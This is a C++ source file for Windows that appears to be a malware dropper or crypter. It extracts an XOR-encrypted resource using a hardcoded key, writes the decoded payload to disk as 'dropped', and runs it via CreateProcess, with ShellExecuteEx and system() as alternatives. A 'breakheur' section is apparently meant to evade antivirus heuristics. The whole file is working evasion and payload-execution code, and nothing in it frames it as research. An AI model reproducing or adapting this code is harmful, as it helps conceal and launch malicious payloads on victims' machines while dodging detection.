#include <windows.h>
#include <fstream>
#include <iostream>
#include <string.h>
#include <tchar.h>
#ifdef WIN32
#include "crossincludes/resource.h"
#elif
#include "resource.h"
#endif
//#include <cstdlib>

using namespace std;

#define breakheur
//#define exec2
#define exec2

void magic(char* in, char* out, size_t size)
{
	char key[] = "#Y&$HEYHJ$*^I4u5w6h64k086Dbhw4T%$fdvsdfvrgh467j";
	//char* key = "WRONG KEY";
	unsigned int i;
	for (i = 0; i < size; i++)
		out[i] = in[i] ^ key[i % (strlen(key))];
}

int readRes(int value, char** res, size_t* s)
{
	HMODULE m_hInstance = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	*res = NULL;
	HRSRC hResource;

	hResource = FindResource(m_hInstance, MAKEINTRESOURCE(value), "TEXT");

	if (hResource)
	{
		HGLOBAL hLoadedResource = LoadResource(m_hInstance, hResource);

		if (hLoadedResource)
		{
			*res = (char*)LockResource(hLoadedResource);

			if (*res)
			{
				*s = SizeofResource(NULL, hResource);
				return 1;
			}
		}
	}

	return 0;
}

#ifdef lollololo
int readRes3(int value, char** res, size_t* s)
{
	HMODULE m_hInstance = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	*res = NULL;
	HRSRC hResource;

	hResource = FindResource(m_hInstance, MAKEINTRESOURCE(value), "TEXT");

	if (hResource)
	{
		HGLOBAL hLoadedResource = LoadResource(m_hInstance, hResource);

		if (hLoadedResource)
		{
			*res = (char*)LockResource(hLoadedResource);

			if (*res)
			{
				*s = SizeofResource(NULL, hResource);
				return 1;
			}
		}
	}

	return 0;

}

int readRes2(int value, char** res, char** out, size_t* s)
{
	HMODULE m_hInstance = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	*res = NULL;
	HRSRC hResource;

	char* red1 = new char[1024];
	char* outbuf = new char[4096 * 10];
	char* red2 = new char[1096];

	hResource = FindResource(m_hInstance, MAKEINTRESOURCE(value), "TEXT");
	red1[0] = 'a';
	red2[0] = red1[0];

	if (hResource)
	{
		HGLOBAL hLoadedResource = LoadResource(m_hInstance, hResource);

		if (hLoadedResource)
		{
			*res = (char*)LockResource(hLoadedResource);

			if (*res)
			{
				*s = SizeofResource(NULL, hResource);
				magic(*res, outbuf, *s);
				*out = outbuf;
			}
		}
	}

	return 0;

}
#endif

#ifdef exec1
int shit1(){
SHELLEXECUTEINFO sei = { 0 };
sei.cbSize = sizeof(sei);
sei.nShow = SW_SHOWNORMAL;
sei.lpFile = TEXT(".\\dropped.exe");
sei.fMask = SEE_MASK_CLASSNAME;
sei.lpVerb = TEXT("open");
sei.lpClass = TEXT("exefile");
ShellExecuteEx(&sei);
return 0;
}
#endif

#ifdef exec2
int shit2() {
STARTUPINFO si;
PROCESS_INFORMATION pi;
ZeroMemory(&pi, sizeof(pi));
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);

LPTSTR szCmdline = _tcsdup(TEXT("dropped"));
LPTSTR commandLine = _tcsdup(TEXT("1234"));
CreateProcess(szCmdline, commandLine,
NULL,           // Process handle not inheritable
NULL,           // Thread handle not inheritable
FALSE,          // Set handle inheritance to FALSE
0,              // No creation flags
NULL,           // Use parent's environment block
NULL,           // Use parent's starting directory
&si,            // Pointer to STARTUPINFO structure
&pi);           // Pointer to PROCESS_INFORMATION structure
return 0;
}
#endif

#ifdef exec3
int shit3() {
return system("dropped");
}
#endif

int main(int argc, char* argv[])
{
	char* res = NULL;
	size_t size = 0;
	DWORD sizeout = 0;
	//char *out = NULL;
	//readRes2(IDR_TEXT1, &res, &out, &size);
	readRes(IDR_TEXT1, &res, &size);
	char* out = new char[size];
	char* out2 = new char[size];
	magic(res, out, size);
#ifdef fileinstack
	char file[128] = "dropped\x00";

	WCHAR DROPPED[128];
	MultiByteToWideChar(CP_ACP, MB_COMPOSITE, file, strlen(file), DROPPED, 128);
#else
#define DROPPED "dropped"
#endif
	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = CreateFile(DROPPED, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD bytesWritten = 0;
		WriteFile(hFile, out, size, &bytesWritten, NULL);
		CloseHandle(hFile);
	}

	hFile = CreateFile(DROPPED, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD bytesWritten = 0;
		ReadFile(hFile, out2, size, &sizeout, NULL);
		CloseHandle(hFile);
#ifdef breakheur
		for (unsigned int i = 0; i < size; i++)
			if (out2[i])
				break;
			else
				break;
#endif
	}

#ifdef exec1
	shit1();
#endif
#ifdef exec2
	shit2();
#endif
#ifdef exec3
	shit3();
#endif
	return 0;
}
